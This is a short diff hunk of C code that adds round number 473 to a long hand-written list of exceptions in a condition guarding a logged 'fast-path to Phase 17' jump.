-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
